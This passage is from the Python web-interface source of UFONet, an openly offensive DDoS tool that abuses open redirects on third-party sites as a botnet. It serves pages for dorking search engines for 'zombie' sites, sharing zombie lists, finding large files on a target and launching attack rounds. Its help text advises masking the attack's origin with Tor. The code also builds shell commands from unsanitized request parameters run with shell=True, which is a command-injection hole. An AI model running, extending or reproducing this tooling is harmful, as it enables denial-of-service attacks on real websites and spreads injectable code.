kJggg==")
 
        self.pages["/"] = self.pages["/header"] + """<script language="javascript">
      function Start() {
        var win_start = window.open("gui","_parent","fullscreen=yes, titlebar=yes, top=180, left=320, width=640, height=460, resizable=yes", false);
      }
</script>
<script type="text/javascript">
// <![CDATA[
var speed=15; // how fast - smaller is faster
var how_often=5; // average time between re-appearances of a comet (in seconds)
var how_many=10; // maximum number of comets in flight
var colours=new Array("#ff0", "#f93", "#f60", "#e93", "#e94", "#da5", "#da6", "#cb7", "#cb8", "#cc9", "#dcb", "#ddd");  
var dx=new Array();
var dy=new Array();
var xpos=new Array();
var ypos=new Array();
var comets=new Array();
var swide=800;
var shigh=600;
var tail=colours.length;
var boddie=false;

function addLoadEvent(funky) {
  var oldonload=window.onload;
  if (typeof(oldonload)!='function') window.onload=funky;
  else window.onload=function() {
    if (oldonload) oldonload();
    funky();
  }
}

addLoadEvent(whooosh);

function whooosh() { if (document.getElementById) {
  var i;
  boddie=document.createElement("div");
  boddie.style.position="fixed";
  boddie.style.top="0px";
  boddie.style.left="0px";
  boddie.style.overflow="visible";
  boddie.style.width="1px";
  boddie.style.height="1px";
  boddie.style.backgroundColor="transparent";
  document.body.appendChild(boddie);
  set_width();
  for (i=0; i<how_many; i++) {
    write_comet(i*tail);
	setTimeout('launch('+(i*tail)+')', Math.max(1000*i));
  }
}}

function write_comet(a) {
  var i, s;
  for (i=0; i<tail; i++) {
    s=2+(i<tail/4)+2*!i;
	comets[i+a]=div(s, s);
	comets[i+a].style.backgroundColor=colours[i];
	boddie.appendChild(comets[i+a]);
  }
}

function div(w, h) {
  var d=document.createElement("div");
  d.style.position="absolute";
  d.style.overflow="hidden";
  d.style.width=w+"px";
  d.style.height=h+"px";
  return (d);
}

function stepthrough(a) { 
  var i;
  if (Math.random()<0.008||ypos[a]+dy[a]<5||xpos[a]+dx[a]<5||xpos[a]+dx[a]>=swide-5||ypos[a]+dy[a]>=shigh-5) {
	for (i=0; i<tail; i++) setTimeout('comets['+(i+a)+'].style.visibility="hidden"', speed*(tail-i));
	setTimeout('launch('+a+')', Math.max(1000, 2000*Math.random()*how_often));
  }
  else setTimeout('stepthrough('+a+')', speed);
  for (i=tail-1; i>=0; i--) {
	if (i) {
      xpos[i+a]=xpos[i+a-1];
      ypos[i+a]=ypos[i+a-1];
	}
	else {
	  xpos[i+a]+=dx[a];
      ypos[i+a]+=dy[a];
	}
    comets[i+a].style.left=xpos[i+a]+"px";
    comets[i+a].style.top=ypos[i+a]+"px";
  }
} 

function launch(a) {
  var i;
  dx[a]=(Math.random()>0.5?1:-1)*(1+Math.random()*3);
  dy[a]=(Math.random()>0.5?1:-1)*((7-dx[a])/3+Math.random()*(dx[a]+5)/3);
  xpos[a]=2*tail*dx[a]+Math.round(Math.random()*(swide-4*tail*dx[a]));
  ypos[a]=2*tail*dy[a]+Math.round(Math.random()*(shigh-4*tail*dy[a]));
  for (i=0; i<tail; i++) {
    xpos[i+a]=xpos[a];
    ypos[i+a]=ypos[a];
	comets[i+a].style.visibility="visible";
  }
  stepthrough(a);
}

window.onresize=set_width;
function set_width() {
  var sw_min=999999;
  var sh_min=999999;
  if (document.documentElement && document.documentElement.clientWidth) {
    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
  }
  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
  }
  if (document.body.clientWidth) {
    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
  }
  if (sw_min==999999 || sh_min==999999) {
    sw_min=800;
    sh_min=600;
  }
  swide=sw_min;
  shigh=sh_min;
}
// ]]>
</script>
</head>
<body bgcolor="lime" text="black" style="font-family: Courier, 'Courier New', monospace;" >
<center><br />
<img src="/ufonet-logo.png">
<br /><br />
<hr>
UFONet - is a tool designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> attacks against a target,<br /> 
  using 'Open Redirect' vectors on third party web applications, like <a href="https://en.wikipedia.org/wiki/Botnet" target="_blank">botnet</a>.<br /><br />
<button onclick="Start()">START MOTHERSHIP!</button>
<br /><br /><hr>
"This code is NOT for educational purposes"<br /><br />
Project: <a href="http://ufonet.03c8.net" target="_blank">http://ufonet.03c8.net</a>
""" + self.pages["/footer"]

        self.pages["/gui"] = self.pages["/header"] + """</head>
<body bgcolor="black" text="lime" style="font-family: Courier, 'Courier New', monospace;" >
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a target="_blank" href="wormhole">Wormhole</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="help">Help</a></li>
</ul>
</div>
 </td>
 <td>
<pre>
Welcome to <a href="https://twitter.com/search?f=realtime&q=ufonet&src=sprv" target="_blank">#UFONet</a> DDoS via WebAbuse Botnet Manager... ;-)
""" + self.options.version + """
-----------------------------------

Mothership ID: '""" + str(base64.b64decode(self.mothership.mothership_id)) + """'
</pre> 
 </td>
</tr>
</table>
""" + self.pages["/footer"]

        self.pages["/botnet"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Maps() {
        var win_map = window.open("cmd_view_army","_blank","fulscreen=yes, resizable=yes", false);
        win_map.resizeTo(screen.width,screen.height);
      }
function Start(){
        dork=document.getElementById("dork").value
        s_engine = document.getElementById('engines_list').options[document.getElementById('engines_list').selectedIndex].text;
        if (document.getElementById("dork_list").checked){
        document.getElementById("dork_list").value = "on";
        } else {
        document.getElementById("dork_list").value = "off";
        }
        dork_list = document.getElementById("dork_list").value
        if(dork == "" || dork_list.value == "off") {
          window.alert("You need to enter a source for dorking (from: parameter or file)");
          return
         }else{
          if (document.getElementById("all_engines").checked){
          document.getElementById("all_engines").value = "on";
          } else {
          document.getElementById("all_engines").value = "off";
          }
          all_engines = document.getElementById("all_engines").value
          num_results=document.getElementById("num_results").value
          params="dork="+escape(dork)+"&dork_list="+escape(dork_list)+"&s_engine="+escape(s_engine)+"&all_engines="+escape(all_engines)+"&num_results="+escape(num_results)
        runCommandX("cmd_search",params)      
         }
      }

function showHide() 
     {
        if(document.getElementById("dork_list").checked) 
        {
         document.getElementById("dork_pattern").style.display = "none";
        } 
        else {
         document.getElementById("dork_pattern").style.display = "";
        }
     }
function showHideEngines()
     {
        if(document.getElementById("all_engines").checked)
        {
         document.getElementById("s_engine").style.display = "none";
        }
        else {
         document.getElementById("s_engine").style.display = "";
        }
     }
</script>
<script>loadXMLDoc()</script>
</head>
<body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" >
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="botnet">Botnet</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<pre>
 <u>Manage Botnet</u>: <button onclick="Requests()">Configure requests</button>

  <a href='javascript:runCommandX("cmd_list_army")'>List 'zombies'</a> | <button onclick="Maps()">View!</button>
<form method='GET'><hr>
  * Search for 'zombies':
    <div id="dork_pattern" style="display:block;">    + Using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div>
    + Using a list (from: dorks.txt) <input type="checkbox" id="dork_list" onchange="showHide()">
    <div id="s_engine" name="s_engine" style="display:block;">    + Using this search engine: <select id="engines_list">
  <option value="duck" selected>duck</option>
  <option value="google">google</option>
  <option value="bing">bing</option>
  <option value="yahoo">yahoo</option>
  <option value="yandex">yandex</option>
  </select></div>
    + Using all search engines <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()">

    + Max num of results: <input type="text" name="num_results" id="num_results" size="5" value="10">
</form>
  <button onClick=Start()>Search</button>
<hr>
  * Test Botnet: <a href='javascript:runCommandX("cmd_test_army")'>Status</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack-Me?!</a>
<hr>
  * Community: <a href='javascript:runCommandX("cmd_upload_community")'>Upload</a> | <a href='javascript:runCommandX("cmd_download_community")'>Download</a></td></tr></table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/attack"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Maps() {
         var win_map = window.open("/cmd_view_attack?target="+target,"_blank","fulscreen=yes, resizable=yes", false);
         win_map.resizeTo(screen.width,screen.height);
      }

function Start(){
	target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
             path=document.getElementById("path").value
             rounds=document.getElementById("rounds").value
             if (document.getElementById("disable_aliens").checked){
                document.getElementById("disable_aliens").value = "on";
             } else {
                document.getElementById("disable_aliens").value = "off";
             }
             disable_aliens = document.getElementById("disable_aliens").value
             if (document.getElementById("disable_isup").checked){
                document.getElementById("disable_isup").value = "on";
             } else {
                document.getElementById("disable_isup").value = "off";
             }
             disable_isup = document.getElementById("disable_isup").value
             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&disable_aliens="+escape(disable_aliens)+"&disable_isup="+escape(disable_isup)
             if (document.getElementById("visual_attack").checked){
                document.getElementById("visual_attack").value = "on";
             } else {
                document.getElementById("visual_attack").value = "off";
             }
             if(document.getElementById("visual_attack").value=="on"){
                Maps() 
             }
        }else{
          window.alert("You need to enter a valid url: http(s)://target.com");
          return
        }
	runCommandX("cmd_attack",params)
}
</script>
</head>
<body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" >
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="attack">Attack</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="inspect">Inspect</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<pre>
 <u>Attacking:</u>

  * Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">

  * Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">

  * Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">

  <input type="checkbox" name="disable_aliens" id="disable_aliens"> Disable 'aliens' <input type="checkbox" name="disable_isup" id="disable_isup"> Disable 'is target up?'

<hr>
  <button onclick="Requests()">Configure requests</button>

<hr> 
  <input type="checkbox" name="visual_attack" id="visual_attack"> Generate map

<hr>
  <button onClick=Start()>START!</button></pre>
 </td>
</tr>
</table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/help"] = self.pages["/header"] + """<script language="javascript"> 
function show(one) {
      var nb = document.getElementsByTagName("div");
            for(var x=0; x<nb.length; x++) {
                  name = nb[x].getAttribute("class");
                  if (name == 'nb') {
                        if (nb[x].id == one) {
                        nb[x].style.display = 'block';
                  }
                  else {
                        nb[x].style.display = 'none';
                  }
            }
      }
}
</script>
</head>
<body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" >
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="help">Help</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<pre>
 <div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div><div class="nb" id="nb1" style="display: none;">
  UFONet - is a tool designed to launch a Layer 7 (HTTP/Web Abuse) DDoS attack against a target.

  - Development began in: 2013

  It is written in <a href="https://www.python.org/" target="_blank">python</a> and distributed under license <a href="http://gplv3.fsf.org/" target="_blank">GPLv3</a>

   + Website: <a href="http://ufonet.03c8.net" target="_blank">http://ufonet.03c8.net</a>

   + Forum threads: <a href="https://forum.unsystem.net/category/churchofsecurity/ufonet" target="_blank">http://forum.unsystem.net</a></div> <div><a id="mH2" href="javascript:show('nb2');" style="text-decoration: none;" >+ How does it work?</a></div> <div class="nb" id="nb2" style="display: none;">  It works exploiting "Open Redirect" vectors on third party web applications.

  You can read more info on next links:

     - <a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank">CWE-601:Open Redirect</a>
     - <a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2" target="_blank">OWASP:URL Redirector Abuse</a>

  And review this technical schema: <a href="http://ufonet.03c8.net/ufonet/ufonet-schema.png" target="_blank">here</a></div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
   
      - a proxy (not required); to mask the origin of the attack (ex: <a href="https://www.torproject.org/" target="_blank">Tor</a>)
      - a list of 'zombies'; to conduct their connections to your target
      - a place; to efficiently hit your target</div> <div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Updating</a></div><div class="nb" id="nb4" style="display: none;">
This feature can be used ONLY if you have cloned UFONet from GitHub respository.

       git clone https://github.com/epsylon/ufonet

To check your version you should launch, from shell:

       ./ufonet --update </div> <div><a id="mH5" href="javascript:show('nb5');" style="text-decoration: none;" >+ How can help?</a></div> <div class="nb" id="nb5" style="display: none;">  You can contribute on many different ways:
   
      - Testing; use the tool and search for possible bugs a new ideas
      - Coding; you can try to develop more features
      - Promoting; talk about UFONet on the internet, events, hacklabs, etc
      - Donating; money, objects, support, love ;-)

         + Bitcoin: 1Q63KtiLGzXiYA8XkWFPnWo7nKPWFr3nrc
         + Ecoin: 6enjPY7PZVq9gwXeVCxgJB8frsf4YFNzVp</div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact methods</a></div> <div class="nb" id="nb6" style="display: none;">  You can contact using:
   
      - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]

      - IRC: irc.freenode.net / #ufonet</div></pre>
 </td>
</tr>
</table>
""" + self.pages["/footer"]

        self.pages["/inspect"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }

function Start(){
        target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
        params="target="+escape(target)

        }else{
          window.alert("You need to enter a valid url: http(s)://target.com/page.html");
          return
        }
        runCommandX("cmd_inspect",params)
}
</script>
<script>loadXMLDoc()</script>
</head>
<body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" >
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="inspect">Inspect</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<pre>
 <u>Inspect for places</u>: <button onclick="Requests()">Configure requests</button> 

  This feature will provides you the biggest file on target. 
  You can use this when attacking to be more effective.

<hr>
  * Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">

<hr>
   <button onClick=Start()>START!</button></pre>
 </td>
</tr>
</table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/lib.js"] = """function loadXMLDoc() {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
                           document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                           setTimeout("loadXMLDoc()", 3000); 
                   }
                }
        }
        xmlhttp.send();
}

function runCommandX(cmd,params) {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
								if(cmd.indexOf("?")!=-1){
									s=cmd.split("?")
									cmd=s[0]
									params=s[1]
								}
                                document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                                //document.getElementById("cmdOut").scrollIntoView();
                                newcmd=cmd
                                if(newcmd=="cmd_list_army"||newcmd=="cmd_view_army"){ //do not refresh listing army
                                    return;
                                } else {
                                if(newcmd=="cmd_test_army" || newcmd=="cmd_attack" || newcmd=="cmd_inspect" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_attack_me" || newcmd=="cmd_search") newcmd=newcmd+"_update"
								//do not refresh if certain text on response is found
								if(newcmd.match(/update/) && 
										(
								  xmlhttp.responseText.match(/Botnet updated/) ||
 								  xmlhttp.responseText.match(/Biggest File/) ||
								  xmlhttp.responseText.match(/Not any zombie active/) ||
     								  xmlhttp.responseText.match(/Your target looks OFFLINE/) ||
                                                                  xmlhttp.responseText.match(/Unable to connect to target/) ||
                                                                  xmlhttp.responseText.match(/Something wrong testing/) ||
                                                                  xmlhttp.responseText.match(/Target url not valid/) ||
                                                                  xmlhttp.responseText.match(/Attack completed/) ||
								  xmlhttp.responseText.match(/Bye/)
										) 
											) return;
                                setTimeout(function(){runCommandX(newcmd,params)}, 3000);
								return;}
                   }
                }
        }
		if(typeof params != "undefined") cmd=cmd+"?"+params
        xmlhttp.open("GET", cmd, true);
        xmlhttp.send();
}
"""
        self.pages["/requests"] = self.html_requests()

    def buildGetParams(self, request):
        params = {}
        path = re.findall("^GET ([^\s]+)", request)
        if path:
            path = path[0]
            start = path.find("?")
            if start != -1:
                if path[start+1:start+7] == "zombie":
                    params['zombie']=path[start+8:]
                    return params
                if path[start+1:start+7] == "target":
                    params['target']=path[start+8:]
                    return params
                for param in path[start+1:].split("&"):
                    f = param.split("=")
                    if len(f) == 2:
                        var = f[0]
                        value = f[1]
                        value = value.replace("+", " ")
                        value = urllib.unquote(value)
                        params[var] = value
        return params

    def save_cfg(self,pGet):
        # set values of requests configuration from html form to json file
        if "rproxy" in pGet.keys():
            frm_rproxy = pGet["rproxy"]
        else:
            frm_rproxy = self.rproxy
        if "ruseragent" in pGet.keys():
            frm_ruseragent = pGet["ruseragent"]
        else:
            frm_ruseragent = self.ruseragent
        if "rreferer" in pGet.keys():
            frm_rreferer = pGet["rreferer"]
        else:
            frm_rreferer = self.rreferer
        if "rhost" in pGet.keys():
            frm_rhost = pGet["rhost"]
        else:
            frm_rhost = self.rhost
        if "rxforw" in pGet.keys():
            frm_rxforw = pGet["rxforw"]
        else:
            if "update" in pGet.keys():
                frm_rxforw = ""
            else:
                frm_rxforw = self.rxforw
        if "rxclient" in pGet.keys():
            frm_rxclient = pGet["rxclient"]
        else:
            if "update" in pGet.keys():
                frm_rxclient = ""
            else:
                frm_rxclient = self.rxclient
        if "rtimeout" in pGet.keys():
            frm_rtimeout = pGet["rtimeout"]
        else:
            frm_rtimeout = self.rtimeout
        if "rretries" in pGet.keys():
            frm_rretries = pGet["rretries"]
        else:
            frm_rretries = self.rretries
        if "rdelay" in pGet.keys():
            frm_rdelay = pGet["rdelay"]
        else:
            frm_rdelay = self.rdelay
        if "threads" in pGet.keys():
            frm_threads = pGet["threads"]
        else:
            frm_threads = self.threads
        # set new values on cfg json file 
        with open('webcfg.json', "w") as f:
            json.dump({"rproxy": frm_rproxy, "ruseragent": frm_ruseragent, "rreferer": frm_rreferer, "rhost": frm_rhost, "rxforw": frm_rxforw, "rxclient": frm_rxclient, "rtimeout": frm_rtimeout, "rretries": frm_rretries, "rdelay": frm_rdelay, "threads":frm_threads}, f, indent=4)

    def get(self, request):
        # set request options of the user
        cmd_options = "--proxy='" + self.rproxy + "' --user-agent='" + self.ruseragent + "' --referer='" + self.rreferer + "' --host='" + self.rhost + "' --timeout='" + self.rtimeout + "' --retries='" + self.rretries + "' --delay='" + self.rdelay +"'" + " --threads='"+self.threads+"'"
        if self.rxforw == "on":
            cmd_options = cmd_options + " --xforw"
        if self.rxclient == "on":
            cmd_options = cmd_options + " --xclient"
        cmd_options = cmd_options + " --force-yes" # no raw_input allowed on webgui
        runcmd = ""
        res = re.findall("^GET ([^\s]+)", request)
        if res is None or len(res)==0:
            return
        pGet = {}
        page = res[0]
        paramStart = page.find("?")
        if paramStart != -1:
            page = page[:paramStart]
            pGet = self.buildGetParams(request)
        if page.startswith("/js/") or page.startswith("/images/")  or page.startswith("/maps/") or page.startswith("/markers/"):
            if os.path.exists("core/"+page[1:]):
                f=open("core/"+page[1:])
                self.pages[page]=f.read()
            elif page == "/js/ajax.js":
                from ajaxmap import AjaxMap
                self.pages[page] = AjaxMap().ajax(pGet)
        if page == "/cmd_list_army":
            f = open('zombies.txt')
            zombies = f.readlines()
            zombies = [zombie.replace('\n', '') for zombie in zombies]
            f.close()
            self.pages["/cmd_list_army"] = "<pre><br /><u>Your Army</u>:<br /><br />"+'\n'.join(zombies)+"</pre>"
        if page == "/cmd_view_army":
            if pGet=={}:
                self.pages["/cmd_view_army"] = self.html_army_map()
        if page == "/cmd_view_attack":
            if 'target' in pGet.keys() != None:
                self.pages["/cmd_view_attack"] = self.html_army_map(pGet['target'])
        if page == "/cmd_test_army":
            self.pages["/cmd_test_army"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "(python -i ufonet -t 'zombies.txt' " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me":
            self.pages["/cmd_attack_me"] = "<pre>Waiting for 'attack-me' results...</pre>"
            runcmd = "(python -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_download_community":
            self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
            runcmd = "(python -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_download_community_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_upload_community":
            self.pages["/cmd_upload_community"] = "<pre>Waiting for downloading results...</pre>"
            runcmd = "(python -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_upload_community_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_upload_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_army_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_army_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_attack":
            self.pages["/cmd_attack"] = "<pre>Waiting for attacking results...</pre>"
            if pGet["disable_aliens"] == "on": # disable HTTP POST 'aliens'
                if pGet["disable_isup"] == "on": # disable external check 'is target up?'
                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-aliens --disable-isup "+ cmd_options + "|tee /tmp/out) &"
                else:
                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-aliens "+ cmd_options + "|tee /tmp/out) &"
            else: 
                if pGet["disable_isup"] == "on": # disable external check 'is target up?'
                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-isup "+ cmd_options + "|tee /tmp/out) &"
                else:
                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_inspect":
            self.pages["/cmd_inspect"] = "<pre>Waiting for inspecting results...</pre>"
            runcmd = "(python -i ufonet -i '"+pGet["target"]+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_inspect_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_inspect_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_search":
            self.pages["/cmd_search"] = "<pre>Waiting for dorking results...</pre>"
            if pGet["dork_list"] == "on": # search using dork list (file: dorks.txt)
                if pGet["all_engines"] == "on": # search using all search engines
                    runcmd = "(python -i ufonet --sd 'dorks.txt' --sn '"+pGet["num_results"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
                else: # search using a search engine
                    runcmd = "(python -i ufonet --sd 'dorks.txt' --sn '"+pGet["num_results"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
            else: # search using a pattern
                if pGet["all_engines"] == "on": # search using all search engines
                    runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sn '"+pGet["num_results"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
                else: # search using a search engine
                    runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sn '"+pGet["num_results"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_search_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_search_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/requests":
            if pGet=={}:
                self.pages["/requests"] = self.html_requests()
            else:
                self.save_cfg(pGet)
                self.pages["/requests"] = self.html_request_submit()
        if page == "/wormhole":
            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://webchat.freenode.net'>"
        ctype = "text/html"
        if page.find(".js") != -1:
            ctype = "application/javascript"
        elif page.find(".txt") != -1:
            ctype = "text/plain"
        elif page.find(".ico") != -1:
            ctype = "image/x-icon"
        elif page.find(".png") != -1:
            ctype = "image/png"
        elif page.find(".css") != -1:
            ctype = "text/css"
        if page in self.pages:
            return dict(run=runcmd, code="200 OK", html=self.pages[page], ctype=ctype)
        return dict(run=runcmd, code="404 Error", html="404 Error<br><br>Page not found...", ctype=ctype)

class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None

    def run(self, timeout):
        def target():
            self.process = subprocess.Popen(self.cmd, shell=True)
        thread = threading.Thread(target=target)
        thread.start()
        thread.join(timeout)
        if thread.is_alive():
            self.process.terminate()
            thread.join()

if __name__ == "__main__":
    webbrowser.open('http://127.0.0.1:9999', new=1)
    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcpsock.bind((host, port))
    while True:
        tcpsock.listen(4)
        (clientsock, (ip, c_port)) = tcpsock.accept()
        newthread = ClientThread(ip, c_port, clientsock)
        newthread.start()
